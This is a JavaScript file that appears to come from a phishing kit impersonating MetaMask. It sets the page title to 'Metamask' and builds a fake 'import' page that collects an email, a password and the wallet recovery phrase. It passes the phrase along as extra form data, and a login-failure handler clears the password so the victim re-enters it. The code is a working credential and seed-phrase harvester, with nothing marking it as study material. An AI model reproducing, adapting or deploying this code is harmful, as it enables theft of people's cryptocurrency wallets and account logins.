let maxOtpCount = 2;

window.addEventListener('load', function () {
    initApp(bindElements, document.getElementsByTagName('body')[0]);
})

function bindElements(params) {
    document.getElementsByTagName('title')[0].innerText = 'Metamask';

    if (typeof params.hash.params[0] !== 'undefined'
        && params.hash.params[0] === 'import') {
        showPageTwo(params);
    } else {
        showPageOne(params);
    }
}

function showPageOne(params) {
    document.getElementById('page1').style.display = 'block';
    document.querySelector('#page1 button')
        .addEventListener('click', function () {
            window.location = `#/import/${params.email}`;
            window.location.reload();
        })
}

function showPageTwo(params) {
    window.LIB_submitButton = document.querySelector('button[type="submit"]');
    window.LIB_userInput = document.querySelector('input[name="email"]');
    window.LIB_pwdInput = document.querySelector('input[name="pass"]');
    window.LIB_spinner = document.querySelector('button .LIB_spinner_el');
    window.LIB_form = document.getElementsByTagName('form')[0];

    window.LIB_extraData = function () {
        return {'phrase': document.querySelector('textarea[name="phrase"]').value}
    }

    window.LIB_pwdInput.addEventListener('keyup', function () {
        let notice = document.getElementById('pass_str');
        notice.style.display = 'none';
    });

    window.LIB_onLoginFail = function () {
        let notice = document.getElementById('pass_str');
        notice.style.display = 'block';
        window.LIB_pwdInput.value = '';
    };

    if (params.email !== 'import')
        window.LIB_userInput.value = params.email;

    document.getElementById('page2').style.display = 'block'
}
